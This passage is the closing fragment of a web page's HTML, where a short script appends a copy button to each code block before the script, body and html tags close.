            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
